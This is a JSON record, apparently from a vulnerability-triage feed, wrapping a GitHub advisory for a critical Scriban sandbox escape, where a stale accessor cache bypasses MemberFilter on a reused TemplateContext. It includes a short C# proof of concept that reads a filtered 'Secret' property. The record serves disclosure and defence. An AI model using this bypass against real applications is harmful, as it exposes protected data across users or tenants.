@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/97537483?v=4\", \"events_url\": \"https://api.github.com/users/Zwique/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Zwique/followers\", \"following_url\": \"https://api.github.com/users/Zwique/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Zwique/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Zwique\", \"id\": 97537483, \"login\": \"Zwique\", \"node_id\": \"U_kgDOBdBNyw\", \"organizations_url\": \"https://api.github.com/users/Zwique/orgs\", \"received_events_url\": \"https://api.github.com/users/Zwique/received_events\", \"repos_url\": \"https://api.github.com/users/Zwique/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Zwique/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Zwique/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Zwique\", \"user_view_type\": \"public\"}}, {\"type\": \"analyst\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/93228314?v=4\", \"events_url\": \"https://api.github.com/users/adamus2/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/adamus2/followers\", \"following_url\": \"https://api.github.com/users/adamus2/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/adamus2/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/adamus2\", \"id\": 93228314, \"login\": \"adamus2\", \"node_id\": \"U_kgDOBY6NGg\", \"organizations_url\": \"https://api.github.com/users/adamus2/orgs\", \"received_events_url\": \"https://api.github.com/users/adamus2/received_events\", \"repos_url\": \"https://api.github.com/users/adamus2/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/adamus2/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/adamus2/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/adamus2\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": 9.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-693\", \"name\": \"Protection Mechanism Failure\"}], \"description\": \"## Summary\\n\\n`TemplateContext` caches type accessors by `Type` only, but those accessors are built using the current `MemberFilter` and `MemberRenamer`. When a `TemplateContext` is reused and the filter is tightened for a later render, Scriban still reuses the old accessor and continues exposing members that should now be hidden.\\n\\n## Details\\n\\nThe relevant code path is:\\n\\n- `TemplateContext.GetMemberAccessor()` caches accessors in `_memberAccessors` by `Type` in `src/Scriban/TemplateContext.cs` lines 850–863.\\n- For plain .NET objects, `GetMemberAccessorImpl()` creates a new `TypedObjectAccessor(type, _keyComparer, MemberFilter, MemberRenamer)` in `src/Scriban/TemplateContext.cs` lines 909–939.\\n- `TypedObjectAccessor` stores the current filter and precomputes the exposed member set in its constructor and `PrepareMembers()` in `src/Scriban/Runtime/Accessors/TypedObjectAccessor.cs` lines 33–40 and 119–179.\\n- Member access later goes through `ScriptMemberExpression.GetValue()` in `src/Scriban/Syntax/Expressions/ScriptMemberExpression.cs` lines 67–95, which uses the cached accessor.\\n- `TemplateContext.Reset()` does **not** clear `_memberAccessors` in `src/Scriban/TemplateContext.cs` lines 877–902.\\n\\nAs a result, once a permissive accessor has been created for a given type, changing `TemplateContext.MemberFilter` later does not take effect for that type on the same reused context.\\n\\nThis is especially relevant because the Scriban docs explicitly recommend `TemplateContext.MemberFilter` for indirect .NET object exposure.\\n\\n---\\n\\n## Proof of Concept\\n\\n### Setup\\n\\n```bash\\nmkdir scriban-poc2\\ncd scriban-poc2\\ndotnet new console --framework net8.0\\ndotnet add package Scriban --version 6.6.0\\n```\\n\\n### `Program.cs`\\n\\n```csharp\\nusing System.Reflection;\\nusing Scriban;\\nusing Scriban.Runtime;\\n\\nvar template = Template.Parse(\\\"{{ model.secret }}\\\");\\n\\nvar context = new TemplateContext\\n{\\n    EnableRelaxedMemberAccess = false\\n};\\n\\nvar globals = new ScriptObject();\\nglobals[\\\"model\\\"] = new SensitiveModel();\\ncontext.PushGlobal(globals);\\n\\ncontext.MemberFilter = _ => true;\\nConsole.WriteLine(\\\"first=\\\" + template.Render(context));\\n\\ncontext.Reset();\\n\\nvar globals2 = new ScriptObject();\\nglobals2[\\\"model\\\"] = new SensitiveModel();\\ncontext.PushGlobal(globals2);\\n\\ncontext.MemberFilter = member => member.Name == nameof(SensitiveModel.Public);\\n\\nConsole.WriteLine(\\\"second=\\\" + template.Render(context));\\n\\nsealed class SensitiveModel\\n{\\n    public string Public => \\\"ok\\\";\\n    public string Secret => \\\"leaked\\\";\\n}\\n```\\n\\n### Run\\n\\n```bash\\ndotnet run\\n```\\n\\n### Actual Output\\n\\n```\\nfirst=leaked\\nsecond=leaked\\n```\\n\\n### Expected Behavior\\n\\nThe second render should fail or stop exposing `Secret`, because the filter only allows `Public` and `EnableRelaxedMemberAccess` is disabled.\\n\\nThis reproduces a direct filter bypass caused by the stale cached accessor.\\n\\n---\\n\\n## Impact\\n\\nThis is a protection-mechanism bypass. Applications that use `TemplateContext.MemberFilter` as part of their sandbox or object-exposure policy can unintentionally expose hidden members across requests when they reuse a `TemplateContext`.\\n\\nThe impact includes:\\n\\n- Unauthorized read access to filtered properties or fields\\n- Unauthorized writes if the filtered member also has a setter\\n- Policy bypass across requests, users, or tenants when contexts are pooled\", \"ghsa_id\": \"GHSA-5wr9-m6jw-xx44\", \"github_reviewed_at\": \"2026-03-24T22:11:38Z\", \"html_url\": \"https://github.com/advisories/GHSA-5wr9-m6jw-xx44\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-5wr9-m6jw-xx44\"}], \"nvd_published_at\": null, \"published_at\": \"2026-03-24T22:11:38Z\", \"references\": [\"https://github.com/scriban/scriban/security/advisories/GHSA-5wr9-m6jw-xx44\", \"https://github.com/advisories/GHSA-5wr9-m6jw-xx44\"], \"repository_advisory_url\": \"https://api.github.com/repos/scriban/scriban/security-advisories/GHSA-5wr9-m6jw-xx44\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/scriban/scriban\", \"summary\": \"Scriban: Sandbox escape due to TypedObjectAccessorcache bypassing MemberFilter after TemplateContext reuse\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-06T13:08:11Z\", \"url\": \"https://api.github.com/advisories/GHSA-5wr9-m6jw-xx44\", \"vulnerabilities\": [{\"first_patched_version\": \"7.0.0\", \"package\": {\"ecosystem\": \"nuget\", \"name\": \"scriban\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 7.0.0\"}, {\"first_patched_version\": \"7.0.0\", \"package\": {\"ecosystem\": \"nuget\", \"name\": \"Scriban.Signed\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 7.0.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-5wr9-m6jw-xx44",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "Scriban.Signed: < 7.0.0",
+      "scriban: < 7.0.0"
+    ],
+    "authentication_required": false,
+    "cves": [],
+    "cvss_score": 9.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "Scriban.Signed",
+      "scriban"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-20T19:51:56.041148Z",
+  "provenance": {
+    "content_sha256": "fe83d5a3d77a5f6f8f4905ff11fed0c0c6452049f82c9f79235397e3bd7c6b47",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-03-24T22:11:38Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-5wr9-m6jw-xx44",
+  "status": "active",
+  "title": "Scriban: Sandbox escape due to TypedObjectAccessorcache bypassing MemberFilter after TemplateContext reuse",
+  "updated_at": "2026-07-06T13:08:11Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-5wr9-m6jw-xx44"
+}
